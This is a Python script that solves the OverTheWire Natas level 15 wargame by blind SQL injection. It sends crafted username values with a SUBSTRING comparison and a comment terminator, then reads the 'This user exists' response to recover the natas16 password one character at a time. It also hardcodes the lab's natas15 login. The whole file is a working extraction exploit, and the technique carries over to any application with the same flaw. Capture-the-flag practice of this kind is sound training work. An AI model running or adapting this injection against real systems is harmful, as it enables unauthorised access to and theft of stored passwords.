
import requests
import string

url = "http://natas15.natas.labs.overthewire.org/"
auth = ("natas15", "SdqIqBsFcz3yotlNYErZSZwblkm0lrvx")

chars = string.ascii_letters + string.digits
password = ""

for i in range(1, 33):
    for c in chars:
        payload = f'natas16" AND SUBSTRING(password,{i},1)="{c}" -- '
        r = requests.get(url, auth=auth, params={"username": payload})
        
        if "This user exists" in r.text:
            password += c
            print(password)
            break